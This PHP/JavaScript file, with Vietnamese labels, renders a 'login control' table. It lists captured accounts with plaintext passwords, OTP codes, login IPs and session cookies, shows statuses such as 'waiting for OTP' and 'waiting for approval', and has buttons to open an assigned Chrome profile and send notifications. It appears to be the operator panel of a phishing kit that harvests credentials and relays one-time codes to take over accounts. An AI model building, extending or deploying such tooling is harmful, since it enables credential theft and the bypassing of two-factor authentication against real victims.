<?php
// LoginControlTable.php - Chuyển đổi từ React sang PHP, giữ nguyên logic và UI
?>
<div class="overflow-x-auto">
  <table class="ui-table">
    <thead>
      <tr class="hover:bg-transparent border-b-border">
        <th class="w-[50px]">
          <input type="checkbox" id="select-all-login" onclick="handleSelectAllLogin(this.checked)">
        </th>
        <th class="text-gray-400 font-semibold whitespace-nowrap px-2">STT, Thời Gian</th>
        <th class="text-gray-400 font-semibold whitespace-nowrap px-2">Tên Link</th>
        <th class="text-gray-400 font-semibold whitespace-nowrap px-2">Tài Khoản</th>
        <th class="text-gray-400 font-semibold whitespace-nowrap px-2">Mật khẩu</th>
        <th class="text-gray-400 font-semibold whitespace-nowrap px-2">Code-OTP</th>
        <th class="text-gray-400 font-semibold whitespace-nowrap px-2">IP Login</th>
        <th class="text-gray-400 font-semibold whitespace-nowrap px-2">Trạng Thái</th>
        <th class="text-gray-400 font-semibold whitespace-nowrap px-2">Cookies</th>
        <th class="text-gray-400 font-semibold whitespace-nowrap px-2">Chrome chỉ định</th>
        <th class="text-gray-400 font-semibold whitespace-nowrap px-2">Thông báo</th>
        <th class="text-gray-400 font-semibold whitespace-nowrap px-2">Hành động</th>
      </tr>
    </thead>
    <tbody id="login-control-table-body">
      <!-- Dữ liệu sẽ được render bằng JS -->
    </tbody>
  </table>
  <div id="no-login-data" class="text-center py-16 text-gray-500" style="display:none;">
    Không có dữ liệu.
  </div>
</div>
<script>
function getStatusBadge(status) {
  if (!status) return 'bg-gray-500/20 text-gray-400 border border-gray-500/30';
  if (status.startsWith('✅')) return 'bg-green-500/20 text-green-400 border border-green-500/30';
  if (status.startsWith('🟡 Chờ phê duyệt')) return 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30';
  if (status.startsWith('🟡 Chờ OTP')) return 'bg-blue-500/20 text-blue-400 border border-blue-500/30';
  if (status.startsWith('📝')) return 'bg-purple-500/20 text-purple-400 border border-purple-500/30';
  if (status.startsWith('❌')) return 'bg-red-500/20 text-red-400 border border-red-500/30';
  if (status.startsWith('🟠')) return 'bg-orange-500/20 text-orange-400 border border-orange-500/30';
  if (status.startsWith('🤖')) return 'bg-indigo-500/20 text-indigo-400 border border-indigo-500/30';
  return 'bg-gray-500/20 text-gray-400 border border-gray-500/30';
}
function renderLoginControlTable(data, selectedRows, notificationTemplates) {
  var tbody = document.getElementById('login-control-table-body');
  tbody.innerHTML = '';
  if (!data || data.length === 0) {
    document.getElementById('no-login-data').style.display = '';
    return;
  }
  document.getElementById('no-login-data').style.display = 'none';
  data.forEach(function(item, index) {
    var tr = document.createElement('tr');
    tr.className = 'border-b-border hover:bg-primary/5';
    tr.innerHTML = `
      <td class="px-2"><input type="checkbox" ${selectedRows.has(item.id) ? 'checked' : ''} onclick="handleSelectRowLogin('${item.id}')"></td>
      <td class="text-gray-400 text-xs px-2">
        <div class="font-bold text-white">${index + 1}</div>
        <div>${new Date(item.time).toLocaleDateString('vi-VN')}</div>
        <div>${new Date(item.time).toLocaleTimeString('vi-VN')}</div>
      </td>
      <td class="text-white font-medium px-2">${item.linkName}</td>
      <td class="text-gray-300 px-2">
        <div class="flex items-center">
          <span>${item.account}</span>
          <button class="ml-1 opacity-50 hover:opacity-100 h-6 w-6" onclick="copyToClipboard('${item.account}')">📋</button>
        </div>
      </td>
      <td class="text-gray-300 px-2"><span>${item.password}</span></td>
      <td class="text-yellow-300 font-mono px-2">${item.otp || 'N/A'}</td>
      <td class="text-gray-300 px-2">
        <div class="flex items-center">
          <span>${item.ip}</span>
          <button class="ml-1 opacity-50 hover:opacity-100 h-6 w-6" onclick="copyToClipboard('${item.ip}')">📋</button>
        </div>
      </td>
      <td class="px-2"><span class="px-2 py-1 text-xs rounded-md whitespace-nowrap ${getStatusBadge(item.status)}">${item.status}</span></td>
      <td class="text-gray-300 px-2">
        <div class="flex items-center">
          <span class="truncate max-w-[100px]">${item.cookie}</span>
          <button class="ml-1 opacity-50 hover:opacity-100 h-6 w-6" onclick="copyToClipboard('${item.cookie}')">📋</button>
        </div>
      </td>
      <td class="px-2"><button class="bg-blue-900/50 text-blue-300 hover:bg-blue-800/50" onclick="onOpenProfile('${item.id}')">${item.chrome}</button></td>
      <td class="px-2"><!-- Notification select + send --></td>
      <td class="px-2"><!-- Action buttons --></td>
    `;
    tbody.appendChild(tr);
  });
}
function copyToClipboard(text) {
  if (!text) return;
  navigator.clipboard.writeText(text);
  alert('Đã sao chép: ' + text.substring(0, 30) + '...');
}
function handleSelectAllLogin(checked) {
  // ...logic chọn tất cả...
}
function handleSelectRowLogin(id) {
  // ...logic chọn từng dòng...
}
function onOpenProfile(id) {
  // ...logic mở profile chrome...
}
</script>
